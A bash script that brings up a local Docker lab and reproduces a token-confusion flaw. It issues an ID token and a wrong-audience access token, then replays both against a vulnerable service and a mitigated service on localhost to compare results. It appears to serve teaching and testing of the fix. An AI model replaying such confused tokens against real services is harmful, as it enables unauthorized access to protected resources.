#!/usr/bin/env bash
set -euo pipefail

VULN="http://localhost:8301"
MIT="http://localhost:8302"

echo "[1/6] Starting lab"
docker compose up --build -d

echo "[2/6] Waiting for health"
for i in {1..30}; do
  if curl -fsS "$VULN/health" >/dev/null && curl -fsS "$MIT/health" >/dev/null; then
    break
  fi
  sleep 1
done

echo "[3/6] Issue ID token (wrong type for API)"
ID_TOKEN=$(curl -s -X POST "$VULN/issue" -H 'content-type: application/json' -d '{"token_kind":"id","aud":"service-a","sub":"alice"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

echo "[4/6] Replay ID token at resource endpoint"
echo "vulnerable:" && curl -s "$VULN/resource" -H "Authorization: Bearer $ID_TOKEN" && echo
echo "mitigated:" && curl -s "$MIT/resource" -H "Authorization: Bearer $ID_TOKEN" && echo

echo "[5/6] Issue access token with wrong audience (service-b)"
WRONG_AUD=$(curl -s -X POST "$VULN/issue" -H 'content-type: application/json' -d '{"token_kind":"access","aud":"service-b","sub":"alice"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

echo "Replay wrong-audience token"
echo "vulnerable:" && curl -s "$VULN/resource" -H "Authorization: Bearer $WRONG_AUD" && echo
echo "mitigated:" && curl -s "$MIT/resource" -H "Authorization: Bearer $WRONG_AUD" && echo

echo "[6/6] Interpretation"
echo "If vulnerable accepts and mitigated rejects, token confusion is reproduced."
